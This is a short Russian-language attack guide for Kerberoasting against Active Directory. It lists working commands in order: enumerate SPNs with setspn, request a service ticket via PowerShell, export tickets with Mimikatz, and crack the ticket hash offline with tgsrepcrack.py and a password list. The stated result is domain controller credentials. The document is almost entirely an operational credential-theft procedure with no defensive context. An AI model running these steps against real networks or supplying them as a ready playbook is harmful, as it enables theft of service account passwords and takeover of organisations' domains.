# Kerberoasting

**Kerberoasting attack guide**

**Инструкция:**

- Проверяем имеющиеся в системе билеты.

`PS C:\ klist`

- Получаем SPN записи с домена.

`PS C:\ setspn -t <DomainName> -Q */*`

- Добавляем в систему новый тип для хранения последующих записей.

`PS C:\ Add-Type -AssemlyName System.IdentityModel`

- Принудительно извлекаем запись MSSQL сервера.

`PS C:\ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN_of_Service>`

- Выгружаем билеты в файлы с помощью Mimikatz.

`Mimikatz # kerberos::list /export`

- Хэш необходимого нам билета перебираем с помощью словаря.

`# python3 tgsrepcrack.py <password_list> <mimikatz_exported_ticket>`


**Результат:**

Учетные данные контроллера домена.
